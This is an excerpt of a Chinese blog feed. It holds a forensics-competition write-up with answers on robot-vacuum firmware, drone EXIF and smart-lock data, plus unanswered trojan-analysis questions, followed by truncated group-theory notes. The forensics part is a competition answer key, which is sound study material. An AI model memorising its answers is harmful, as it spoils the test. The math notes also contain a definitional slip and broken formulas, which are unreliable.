src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106205801721.png" alt="image-20251106205801721"></p><h2 id="question1">question1√</h2><p>分析扫地机器人数据，robot1.bin采用的压缩算法是？[答案格式:xxxx]</p><p>在用<code>binwalk</code>分析<code>robot1.bin</code>的时候就可以知道了</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106205831979.png" alt="image-20251106205831979"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LZMA</span><br></pre></td></tr></table></figure><h2 id="question2">question2√</h2><p>扫地机器人使用的软件版本是？[答案格式:0.0.0]</p><p>确定完一些偏移之后，现在就可以直接用<code>winhex</code>打开。然后直接搜索<code>version</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106210420160.png" alt="image-20251106210420160"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3.1.0</span><br></pre></td></tr></table></figure><h2 id="question3">question3√</h2><p>扫地机器人id是？[答案格式:21243245838790]</p><p>继续硬搜，搜索<code>id</code>字样，继续搜索就会搜索到</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106210735520.png" alt="image-20251106210735520"></p><h2 id="question4">question4√</h2><p>扫地机器人云证书的前6位是？[答案格式:sdfead]</p><p>继续搜索，我们知道证书的英文是<code>certificate</code>，直接搜索<code>cer</code>即可，一搜就得到</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106210916303.png" alt="image-20251106210916303"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MIIDnj</span><br></pre></td></tr></table></figure><h2 id="question5">question5√</h2><p>扫地机器人连接过的wifi的ssid是(channl1)？[答案格式:xx_xx_xx]</p><p>继续暴力硬搜<code>ssid</code>，一搜就到，然后注意<code>U</code>不能算进去，应该会有考虑到内存对齐之类的。</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106211117258.png" alt="image-20251106211117258"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ELPASO_TPLINK_C04A00BD0769</span><br></pre></td></tr></table></figure><h2 id="question6">question6√</h2><p>扫地机器人连接过的wifi的密码是(channl1)？[答案格式:xxxx]</p><p>就是在<code>ssid</code>下面就是，要注意从哪里到哪里（这个是坑点）</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106211247772.png" alt="image-20251106211247772"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin123</span><br></pre></td></tr></table></figure><h2 id="question7">question7√</h2><p>扫地机器人的时区是？[答案格式:xx/xx]</p><p>一开始我是直接搜索关键词<code>utc</code>，发现没有符合答案格式的结果，后来就直接搜索关键字<code>time</code>，出现了结果</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106211723325.png" alt="image-20251106211723325"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">America/Denver</span><br></pre></td></tr></table></figure><h2 id="question8">question8√</h2><p>扫地机器人的名称是？[答案格式:xxxxx]</p><p>继续暴力搜索，使用关键字搜索<code>name</code>，从前面这么多题就会发现该<code>bin</code>文件的字符串一般都是以<code>U</code>结尾的。</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106211834948.png" alt="image-20251106211834948"></p><h2 id="question9">question9√</h2><p>无人机飞行纬度前两位是？[答案格式:xx]</p><p>接下来就是无人机的了，直接<code>binwalk</code>继续确定偏移，发现无人机不是给的固件，而是给两张图片，直接查看图片的<code>exif</code>信息</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106213232162.png" alt="image-20251106213232162"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">31</span><br></pre></td></tr></table></figure><h2 id="question10">question10√</h2><p>无人机的快门速度是？[答案格式:x/xxx]</p><p>该单位应该是秒，一开始我还以为<code>/</code>后面是单位，结果是速度用分数表示，还是继续看<code>exif</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106213828431.png" alt="image-20251106213828431"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>/<span class="number">400</span></span><br></pre></td></tr></table></figure><h2 id="question11">question11√</h2><p>分析智能门锁数据包，请给出用户“wonderful”首次开门时间？[答案格式:2000-01-01 00:00-00:00]</p><p>接下来分析智能门锁文件，发现该压缩包给的是<code>caseinfo.json</code>文件，以及一些文件</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106213936191.png" alt="image-20251106213936191"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106214015331.png" alt="image-20251106214015331"></p><p>直接使用<code>vscode</code>打开该文件夹，然后暴力搜索即可，发现没有，后来直接找到了这个数据库</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106215735705.png" alt="image-20251106215735705"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106215744489.png" alt="image-20251106215744489"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2023</span>-02-<span class="number">17</span> <span class="number">18</span>:<span class="number">56</span>:<span class="number">38</span></span><br></pre></td></tr></table></figure><h2 id="question12">question12√</h2><p>分析智能门锁数据包，请给出智能门锁MAC地址？[答案格式：字母大写]</p><p>继续暴力搜索<code>mac</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106215148487.png" alt="image-20251106215148487"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E8:BD:63:D0:6F:AD</span><br></pre></td></tr></table></figure><h1 id="二进制文件分析">二进制文件分析</h1><p>首先这个二进制程序是在黑客电脑中的，对应的一个就是前面流量分析中<code>setup.exe</code>相当于木马软件，第二个就是<code>控制端.exe</code>这个程序。</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106231259229.png" alt="image-20251106231259229"></p><ul><li>在问题中有明确给出这两个程序的称呼，一个是<code>木马程序也就是setup.exe</code>、另一个是<code>控制程序也就是控制端.exe</code>。（一开始我还以为是<code>GHOST2011.exe</code>）是控制端程序，感觉这个像是代理。</li><li>而前五题专门是分析控制程序的，而后五题专门是分析木马程序的。前五题考<code>python逆向</code>、后五题考<code>exe</code>逆向。</li></ul><h2 id="question1">question1</h2><p>分析黑客电脑，控制端程序传输协议是什么协议？[答案格式:http]</p><h2 id="question2">question2</h2><p>分析黑客电脑，控制端程序接收数据缓冲区大小是多少？[答案格式:100]</p><h2 id="question3">question3</h2><p>分析黑客电脑，控制端程序接收并判断几种指令？[答案格式:1]</p><h2 id="question4">question4</h2><p>分析黑客电脑，控制端程序连接结束指令是什么？[答案格式:xxx]</p><h2 id="question5">question5</h2><p>分析黑客电脑，控制端程序配置文件解密函数是什么?[答案格式:x_x]</p><h2 id="question6">question6</h2><p>分析黑客的木马程序，该程序控制端ip是？[答案格式:127.0.0.1]</p><h2 id="question7">question7</h2><p>分析黑客的木马程序，程序在地址0x00410CA4处调用了Sleep函数，请问该函数会暂停几秒？[答案格式:3]</p><h2 id="question8">question8</h2><p>分析黑客的木马程序，该程序“png”型资源下有两张图片，程序图标对应图片的MD5值是？[答案格式:字母小写]</p><h2 id="question9">question9</h2><p>分析黑客的木马程序，哪个函数直接调用了HOST型资源？[答案格式:sub_1234]</p><h2 id="question10">question10</h2><p>分析黑客的木马程序，该程序会绕过哪个杀毒软件？[答案格式:腾讯]</p>]]></content>
    
    
    <summary type="html">前言：跑去打美亚了，最近突突一下取证和期末。pgs题目质量没的说。</summary>
    
    
    
    <category term="取证" scheme="http://iyheart.github.io/categories/%E5%8F%96%E8%AF%81/"/>
    
    
  </entry>
  
  <entry>
    <title>群论</title>
    <link href="http://iyheart.github.io/2025/10/17/%E6%95%B0%E5%AD%A6blog/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0/%E7%BE%A4%E8%AE%BA/"/>
    <id>http://iyheart.github.io/2025/10/17/%E6%95%B0%E5%AD%A6blog/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0/%E7%BE%A4%E8%AE%BA/</id>
    <published>2025-10-17T06:18:42.000Z</published>
    <updated>2025-10-19T11:50:47.250Z</updated>
    
    <content type="html"><![CDATA[<ul><li>群、环、域，这三个都是近世代数的一些概念，而近世代数也被称为抽象代数。</li><li>近世代数所研究的对象是代数系。对于整数加法运算，整数乘法运算、矩阵运算等，都是在研究某一特定集合的特定运算。</li><li>而近世代数，就是将这些原本抽象的运算，再进一步的抽象出来，探究他们共同的运算性质和规律。<ul><li>整数加法：满足加法结合律、有逆元、有单位元。</li><li>矩阵运算：特定集合下满足矩阵乘法、有单位矩阵、有逆矩阵</li><li>近世代数将这些进行进一步抽象，得到了群、环、域（虽然矩阵乘法是半群）</li></ul></li><li>接下来就来介绍一下群</li></ul><h1 id="群的定义">群的定义</h1><blockquote><p><strong>定义1</strong>：排列（也被称为置换<code>permutation</code>）</p><p>给定集合$X$，$X$到$X$自身的一个双射称为一个排列。</p><p>给定集合$X$到$X$自身全体排列的集合记作$S_n$。</p><p>注解：置换本质上是一个函数，一般使用$\pi、\sigma$</p><p><strong>定义2</strong>：群的定义</p><p>一个群是一个三元组$(G,\circ,e)$，其中$G$ 是一个集合。</p><ul><li>对于$\circ$：$G×G\rightarrow G$，是一个二元运算（这个运算中隐含了封闭性）</li><li>对于$e\in G$：是一个特殊元素称作单位。</li><li>满足如下运算（公理），则$(G,\circ,e)$就被称为一个群：</li><li>（单位）$\forall a \in G$，$ae=ea=a$</li><li>（逆元）$\forall a\in G,\exists a^{-1}\in G，a^{-1}a=aa^{-1}=e$</li><li>（结合）$(a·b)·c=a·(b·c)$</li></ul><p>注解1：群是一个<code>结构</code>，这个<code>结构=集合+运算+公理</code></p><p>注解2：群的公理可修改（增加、减少、改变条件）</p><p>注解3：群存在<strong>变体</strong>，比如数据只有$(G,\circ)$，然后再加上群定义中的结合公理，则称$G$是一个半群。</p><p>注解4：再介绍一个群的<strong>变体</strong>，有一个三元组$(G,\circ,e)$，它没有逆元公理，此时该群称为<strong>幺半群(Monoid)</strong></p><p>注解5：前面的变体都是减少条件，而<strong>阿贝尔群</strong>(Abel)则是增加条件，增加了一个公理<strong>交换律</strong>，即$\forall a,b,~~~ a·b=b·a$，</p><p><strong>例子1</strong>：</p><p>对于三元组$(\Z,+,0)$，即整数集合上的加法运算，单位元是<code>0</code>。该三元组是一个<strong>阿贝尔群</strong></p><p><strong>例子2</strong>：</p><p>对于三元组$(\Z/m,+,0)$，即整数集合上模<code>m</code>的加法运算，单位元是<code>0</code>，该三元组也是一个<strong>阿贝尔群</strong></p><p><strong>例子3</strong>：</p><p>对于三元组$(\R,+,0)$、$(\Q,+,0)$、$(\C,+,0)$，即在实数、有理数、复数上的加法运算，也构成<strong>阿贝尔群</strong>。</p><p><strong>例子4</strong>：</p><p>对于三元组$(\C^{×},×,1)$，这里$C^{×}$指的是乘法可逆元，目前可以理解为$\C-{0}$即一个复数集去掉元素<code>0</code>，也构成<strong>阿贝尔群</strong>。</p><p><strong>例子5</strong>：</p><p>对于三元组$(\R_{&gt;0},×,1)$也构成一个<strong>阿贝尔群</strong></p><p><strong>例子6</strong>：</p><p>存在许多非<strong>阿贝尔群</strong>，$(S_n,\circ,e)$，$e=Id_{X_n}$，也就是定集合$X$到$X$自身全体排列的集合，当$n≥3$时就不是阿贝尔群。</p><p><strong>例子7</strong>：</p><p>对于三元组$(GL_n(F),\circ,I_n)$，也就是<strong>在数域F</strong>中$n×n,n≥2$的可逆矩阵，满足某个代数运算，单位元为$I_n$，该三元组构成一个<strong>非阿贝尔群</strong>。数域F如何定义，这里不多说，可以看看丘维声高代的第一章。</p><p>简单给一下$GL_n(F)$的定义，$M_n(F)$表示所有$n×n$的矩阵，元素来自域$F$：<br>$$<br>GL_n(F)={A∈M_n(F)∣det(A)≠0}<br>$$</p></blockquote><h1 id="群的定义">群的定义</h1><ul><li>群中的最基本的概念就是这些，之后再由这些最基础的，才引申出对称群、四元数群、二面体群等等。</li><li>所以先要来介绍一下最基本的群概念</li></ul><p><img src="/2025/10/17/%E6%95%B0%E5%AD%A6blog/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0/%E7%BE%A4%E8%AE%BA/image-20241126145639144.png" alt="image-20241126145639144"></p><h2 id="群和半群">群和半群</h2><ul><li>群是由一个集合和一个二元运算构成的代数系，它在近世代数中是最基本的一个代数系。</li><li>首先明确一点：群是建立在集合之上的，满足一定运算条件的集合才会被称为群。</li><li>其次再注意：群定义中的乘法运算并不是我们常用的乘法运算，它只是运算的一个代表，了解了群之后我们根据定义可以得到整数加法（运算符为：+）构成一个群，此时乘法符号：（·）就会变成加法符号了。具体再深入理解即可。</li><li>这里先来介绍半群的概念</li></ul><blockquote><p><strong>半群的定义</strong>：</p><p>设G是一个非空集合，若在G上定义一个乘法运算·满足以下四个条件，则G被称为群。</p><ol><li><strong>封闭性</strong>：G关于运算（·）是封闭的，即对于G中任意元素a，b有a·b∈G</li><li><strong>结合律</strong>：G对于运算（·），集合律成立，即对于S中任意元素a，b，c，有<strong>a·(b·c)=(a·b)·c</strong></li></ol></blockquote><ul><li>接下来再引出群的概念</li></ul><blockquote><p><strong>群的定义：</strong></p><p>设G是一个非空集合，若在G上定义一个乘法运算·满足以下四个条件，则G被称为群。</p><ol><li><strong>封闭性</strong>：G关于运算（·）是封闭的，即对于G中任意元素a，b有a·b∈G</li><li><strong>结合律</strong>：G对于运算（·），集合律成立，即对于S中任意元素a，b，c，有<strong>a·(b·c)=(a·b)·c</strong></li><li><strong>单位元</strong>：在G中有一个元素e（左单位元），对于G中任意元素a，有<strong>e·a=a</strong></li><li><strong>逆元</strong>：对于G中任意元素a都存在G中的一个元素b（左逆元），有<strong>b·a=e</strong></li></ol></blockquote><ul><li>通常群的这种代数结构，我们用**(G,·)**这种形式来表示，G是一个集合，·是一个运算符<ul><li>比如整数加法群：（Z，+）</li><li>去零整数乘法群：（Z/{0}，·）</li></ul></li></ul><h2 id="其他群">其他群</h2><ul><li><p>群和半群是群中俩个最基本的概念，还有一些群接下来再来说明一下</p></li><li><p>如果半群中存在单位元，则就被称为含幺（yao）半群(monoid)</p></li></ul><blockquote><p><strong>含幺半群的定义</strong>：</p><ol><li><strong>封闭性</strong>：G关于运算（·）是封闭的，即对于G中任意元素a，b有a·b∈G</li><li><strong>结合律</strong>：G对于运算（·），集合律成立，即对于S中任意元素a，b，c，有<strong>a·(b·c)=(a·b)·c</strong></li><li><strong>单位元</strong>：在G中有一个元素e（左单位元），对于G中任意元素a，有<strong>e·a=a</strong></li></ol></blockquote><ul><li>而阿贝尔群则是在群的定义上多出了交换律</li></ul><blockquote><p>设G是一个非空集合，若在G上定义一个乘法运算·满足以下四个条件，则G被称为群。</p><ol><li><strong>封闭性</strong>：G关于运算（·）是封闭的，即对于G中任意元素a，b有a·b∈G</li><li><strong>结合律</strong>：G对于运算（·），集合律成立，即对于S中任意元素a，b，c，有<strong>a·(b·c)=(a·b)·c</strong></li><li><strong>单位元</strong>：在G中有一个元素e（左单位元），对于G中任意元素a，有<strong>e·a=a</strong></li><li><strong>逆元</strong>：对于G中任意元素a都存在G中的一个元素b（左逆元），有<strong>b·a=e</strong></li><li><strong>交换律</strong>：对任何a，b∈G有<strong>a·b=b·a</strong></li></ol></blockquote><ul><li>这里也顺带提一下有限群和无限群：<ul><li>有限群：群G如果是有限集，那么就被称为有限群。</li><li>无限群：群G如果是无限集，那么就被称为无限群。</li></ul></li></ul><h2 id="阶段习题1">阶段习题1</h2><ul><li><p>近世代数这部分还是比较偏抽象，逻辑性高的，所以里面的题目都是证明题为主。而了解了群的定义后基本上就是根据定义去证明某个集合加运算是不是群或者半群。包括接下来学的群的定义也一样是证明群。</p></li><li><p>这里找几题书上的例题和练习证明（学习过程中最好是先看看概念和例题，然后动手写纸上证明，要是不闲麻烦可以将证明再写到博客上，或者直接截图。）</p></li></ul><p><img src="/2025/10/17/%E6%95%B0%E5%AD%A6blog/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0/%E7%BE%A4%E8%AE%BA/image-20241126154726998.png" alt="image-20241126154726998"></p><h1 id="群的性质">群的性质</h1><h2 id="单位元和逆元的性质">单位元和逆元的性质</h2><ul><li>对于单位元，单位元被分为左单位元和右单位元</li></ul><blockquote><p><strong>左、右单位元</strong>：</p><p>设是一个半群（G，·）</p><p><strong>左单位元</strong><br>$$<br>若有元素e_L使对任何a∈G有，e_L·a=a，则e_L叫做左单位元<br>$$<br><strong>右单位元</strong><br>$$<br>若有元素e_R使对任何a∈G有，e_R·a=a，则e_R叫做右单位元<br>$$</p></blockquote><h2 id="群的性质">群的性质</h2><h1 id="群的同态和同构">群的同态和同构</h1><h2 id="前置知识">前置知识</h2><h2 id="同态与同构">同态与同构</h2><ul><li>前置知识基本上就是高数第一章所学的集合和映射。</li><li>接下来就介绍一下同态和同构，同态和同构这俩个概念还是比较抽象的，需要借助俩个例子进行理解。</li></ul><blockquote><p><strong>同态的定义</strong>：<br>$$<br>\begin{array}{l}<br>设代数系统(A,·)和代数系统(B,\odot),\如果存在映射f,把A中的元素映射到B中，并且对于任意a、b∈A，都有\</p><pre><code class="language-f(a·b)=f(a)\odot">那么这个映射属于同态映射(同态可以理解为同样形态)。\end&#123;array&#125;$$**同构的定义**：$$\begin&#123;array&#125;&#123;l&#125;如果同态映射还是一一映射，则称为同构映射。\end&#123;array&#125;$$</code></pre></blockquote><ul><li>对于单纯看同态和同构的定义，确实比较难以理解，所以这边就举俩个例子。</li><li><strong>例1：对于高中的一类题型抽象函数的题型，函数满足某些性质，考察的就是同态和同构的定义</strong></li></ul><blockquote><p><strong>指数乘法与整数加法运算</strong>：<br>$$<br>\begin{array}{l}<br>假设整数集合Z里的运算是加法，Z通过映射<br>\~~<s><s><s><s><s><s><s><s><s><s><s><s><s>f:a→e^a\<br>产生一个实数集合(这里e是自然常数):<br>\</s></s></s></s></s></s></s></s></s></s></s></s></s>~{e^a\mid a∈Z}<br>\定义这个实数集合里的运算是乘法，于是有\</p><pre><code class="language-f(a·b)=f(a)\odot(b)\">~~~~~~~~~~~~~~~~即f(a+b)=f(a)·(b)\\~~~~~~~~~~~~~~~~即e^&#123;a+b&#125;=e^a·e^b\end&#123;array&#125;$$</code></pre></blockquote><ul><li><strong>例2：对于高中导数题中，会有碰到指对同构类型的题目</strong></li></ul><blockquote></blockquote><h1 id="变换群与置换群">变换群与置换群</h1><h2 id="变换群">变换群</h2><ul><li>在介绍变换群之前，我们先要介绍映射关系的乘法运算，从而直接引出变换群。</li></ul><blockquote><p><strong>映射关系的乘法运算</strong>：<br>$$<br>\begin{array}{l}<br>规定集合A上的两个变换f和g的乘法如下:\<br>对于任意a∈R有fg(a)=f(g(a))<br>\end{array}<br>$$<br><strong>注意</strong>：这时变换关系（映射关系）的乘法运算，之后变换群中映射的乘法运算也就是该运算。</p><p><strong>变换群定义</strong>：<br>$$<br>\begin{array}{l}<br>一个集合A的若干变换如果对于变换的乘法构成群,则称为变换群。<br>\end{array}<br>$$</p><p><strong>注意</strong>：定义中构成群的是变换关系（映射关系）即f、g这种映射构成的集合满足群的定义而不是某个集合元素经过某个变换关系所构成的集合构成群。所以乘法构成群，群中的元素是<strong>f、g、h、恒等变换</strong>这些映射关系。</p><p><strong>强调：<strong>变换群中的单位元是</strong>恒等变化</strong>这一映射关系</p><p><strong>定理1</strong>：<br>$$<br>\begin{array}{l}<br>集合A上所有一一变换能构成群,该群被称为最大变换群G<br>\end{array}<br>$$</p><p><strong>定理5</strong>：凯莱定理（cayley定理）<br>$$<br>\begin{array}{l}<br>任何一个群都同构于一个变换群<br>\end{array}<br>$$</p></blockquote><ul><li>这里给一个例题：</li></ul><p><img src="/2025/10/17/%E6%95%B0%E5%AD%A6blog/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0/%E7%BE%A4%E8%AE%BA/image-20250101222350884.png" alt="image-20250101222350884"></p><h2 id="置换群">置换群</h2><ul><li>理解每个群，要理解群中的元素到底指的是什么。要不然确实挺懵的。就像我理解变换群一样，刚开始并不知道变换群将的是对应关系。</li><li>接下来是置换群，置换群是比较直观，但确实一个分水岭。</li></ul><blockquote><p><strong>置换群的定义</strong>：<br>$$<br>\begin{array}{l}<br>有限集上的一一变换叫做置换。同一集合上的若干置换构成的群称为置换群。\<br>包含n个元素的集合上的全体置换作成群的群，称为n次对称群，记为S_n<br>\end{array}<br>$$<br><strong>注意1</strong>：置换群中的元素也和变换群一样，是<strong>有限集上一一变换</strong>构成的集合。该集合满足群的条件后，就被称为置换群。所以该群的元素还是像f、g这类的变换法则。</p><p><strong>注意2</strong>：置换群是变换群中的一种，所以可以类比变换群去学习置换群</p><p><strong>强调</strong>：可以类比一下变换群中的最大变换群，去记忆对称群</p><p><strong>定理1</strong>：有限群的凯莱定理<br>$$<br>\begin{array}{l}<br>任何一个有限群都同构于一个置换群<br>\end{array}<br>$$<br><img src="/2025/10/17/%E6%95%B0%E5%AD%A6blog/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0/%E7%BE%A4%E8%AE%BA/image-20250101232210607.png" alt="image-20250101232210607"></p><p><img src="/2025/10/17/%E6%95%B0%E5%AD%A6blog/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0/%E7%BE%A4%E8%AE%BA/image-20250101232403637.png" alt="image-20250101232403637"></p></blockquote><h3 id="置换的乘法">置换的乘法</h3><ul><li>这里了解完置换的定义和循环置换、对换后再来理解置换的乘法。这里讲完对换乘法之后就可以直接来到对称群</li></ul><h3 id="对称群">对称群</h3><ul><li>从上面的置换群定义中，得到了对称群的定义。从而再引出一些列概念，比如<strong>循环置换</strong></li></ul><blockquote><p><strong>对称群的定义</strong>：<br>$$<br>\begin{array}{l}<br>包含n个元素的集合上的全体置换作成群的群，称为n次对称群，记为S_n<br>\end{array}<br>$$<br><strong>定理2</strong>：<br>$$<br>\begin{array}{l}<br>n次对称群S_n的阶是n!,即\mid S_n \mid=n!<br>\end{array}<br>$$<br><strong>定理3</strong>：<br>$$<br>\begin{array}{l}<br>置换可以表示为若干个不相交循环置换的乘积<br>\end{array}<br>$$<br><strong>定理4</strong>：<br>$$<br>\begin{array}{l}<br>任何一个循环置换都可以表示为若干个对换的乘积<br>\end{array}<br>$$<br><strong>定理4注解</strong>：<br>$$<br>\begin{array}{l}<br>定理4还可以更准确地说为：\<br>k-循环可以表示为至少(k-1)个对换的乘积\<br>或者(r_1r_2···r_{k-1}r_k)=(r_1r_k)·(r_1r_{k-1})·····(r_1r_2)<br>\end{array}<br>$$<br><strong>推论</strong>：<br>$$<br>\begin{array}{l}<br>任何一个置换都可以表示为若干个对换的乘积<br>\end{array}<br>$$</p></blockquote><h3 id="奇置换和偶置换">奇置换和偶置换</h3><ul><li>由任何一个置换都可以由若干个对换表示，我们引出了奇置换和偶置换。</li></ul><blockquote><p><strong>奇偶置换定义</strong>：<br>$$<br>\begin{array}{l}<br>在S_n中,能够表示为奇数多个对换乘积的置换称为奇置换\能够表示为偶数多个对换乘积的置换称为偶置换\<br>所有偶置换的集合记为A_n<br>\end{array}<br>$$<br>注意：这里的所有偶置换构成的集合比较特殊和重要。该集合关于变换的乘法也能构成一个群，该群有个名称叫做交错群。</p><p><strong>交错群的定义</strong>：<br>$$<br>\begin{array}{l}<br>n元偶置换全体组成的集合为A_n\<br>A_n对乘法构成一个群，该群称为交错群,其阶为\<br>\mid A_n\mid=\frac{n!}{2}<br>\end{array}<br>$$<br><strong>定理5</strong>：<br>$$<br>\begin{array}{l}<br>当n≥2时,S_n中奇置换和偶置换各占一半,即\mid A_n 